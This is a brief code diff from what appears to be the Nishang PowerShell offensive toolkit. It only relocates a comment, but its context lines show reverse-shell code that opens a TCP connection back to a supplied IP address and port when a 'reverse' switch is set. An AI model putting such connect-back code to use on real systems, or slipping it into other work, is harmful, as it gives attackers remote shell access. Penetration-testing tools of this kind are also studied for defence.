@@ -60,9 +60,10 @@ https://github.com/samratashok/nishang
 
     )
 
-    #Connect back if the reverse switch is used.
+    
     try 
     {
+        #Connect back if the reverse switch is used.
         if ($Reverse)
         {
             $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
